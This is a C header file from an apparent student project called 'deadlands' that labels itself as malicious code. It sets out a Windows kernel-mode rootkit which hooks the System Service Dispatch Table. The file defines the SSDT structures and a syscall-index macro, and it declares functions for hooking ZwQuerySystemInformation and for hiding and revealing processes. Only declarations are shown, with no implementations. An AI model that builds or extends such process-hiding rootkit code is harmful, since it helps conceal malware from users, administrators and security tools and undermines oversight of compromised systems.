/*
**
** Malicious Code - Project: deadlands
** Filename	: [ deadlands-ssdt.h ]
** Method	: [ System Service Dispatch Table ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#ifndef __DEADLANDS_SSDT_H__
# define __DEADLANDS_SSDT_H__

#include <ntddk.h>

/*
** - Defines:
*/
# define DEVICE_NAME	L"\\Device\\DeadlandsSSDT"
# define DOSDEVICE_NAME	L"\\DosDevices\\DeadlandsSSDT"

#define SYSCALL_INDEX(function) *(PULONG)((PUCHAR)(function) + 1)

/*
** - Type definitions:
*/
typedef int				INT32;
typedef unsigned int	DWORD;
typedef unsigned char	BYTE;

#pragma pack(1)
typedef struct		_ServiceDescriptorEntry
{
	DWORD			*ServiceTableBase;
	DWORD			*CounterTable;
	DWORD			NumberOfServices;
	BYTE			*ArgumentTable;
}					SSDE, ServiceDescriptorEntry, *pServiceDescriptorEntry;

typedef struct		_ServiceDescriptorTable
{
	SSDE			descriptorEntry[4]; // [0]: ntoskrnl, [1]: win32k, [3..4]: unused
}					SSDT, ServiceDescriptorTable, *pServiceDescriptorTable;

struct				_SYSTEM_THREADS 
{
	LARGE_INTEGER	KernelTime; 
	LARGE_INTEGER	UserTime; 
	LARGE_INTEGER	CreateTime; 
	ULONG			WaitTime; 
	PVOID			StartAddress; 
	CLIENT_ID		ClientIs; 
	KPRIORITY		Priority; 
	KPRIORITY		BasePriority; 
	ULONG			ContextSwitchCount; 
	ULONG			ThreadState; 
	KWAIT_REASON	WaitReason; 
};

struct				_SYSTEM_PROCESSES 
{ 
	ULONG			NextEntryOffset;
	ULONG			ThreadCount; 
	ULONG			Reserved[6]; 
	LARGE_INTEGER	CreateTime; 
	LARGE_INTEGER	UserTime; 
	LARGE_INTEGER	KernelTime; 
	UNICODE_STRING	ProcessName; 
	KPRIORITY		BasePriority; 
	ULONG			ProcessId; 
	ULONG			InheritedFromProcessId; 
	ULONG			HandleCount; 
	ULONG			Reserved2[2]; 
	VM_COUNTERS		VmCounters; 
	IO_COUNTERS		IoCounters; 
	struct _SYSTEM_THREADS	Threads[1]; 
};

typedef enum		_SYSTEM_INFORMATION_CLASS
{
	SYSTEMBASICINFORMATION,
	SYSTEMPROCESSORINFORMATION,
	SYSTEMPERFORMANCEINFORMATION,
	SYSTEMTIMEOFDAYINFORMATION,
	SYSTEMPATHINFORMATION,
	SYSTEMPROCESSINFORMATION,
	// Many others... :p
}					SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (* _ZWQUERYSYSTEMINFORMATION)(ULONG SystemInformationCLass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

/*
** - Import:
*/
__declspec(dllimport)  ServiceDescriptorEntry KeServiceDescriptorTable;

/*
** - Function prototypes:
*/
// DRIVER FUNCTIONS:
NTSTATUS				DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
NTSTATUS				DriverUnload(PDRIVER_OBJECT pDriverObject);
NTSTATUS				DriverIrpUnsupported(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS				DriverIrpCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS				DriverIrpClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS				DriverIrpWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

// ALGORITHM: SSDT HOOKING
NTSTATUS				HookSyscall(void);
NTSTATUS				unHookSyscall(void);
NTSTATUS				HideProcess(IN OUT PVOID SystemInformation);
NTSTATUS				ViewProcess(IN OUT PVOID SystemInformation);

NTSYSAPI NTSTATUS NTAPI	ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
NTSTATUS				NewZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

#endif /* !__DEADLANDS_SSDT_H__ */
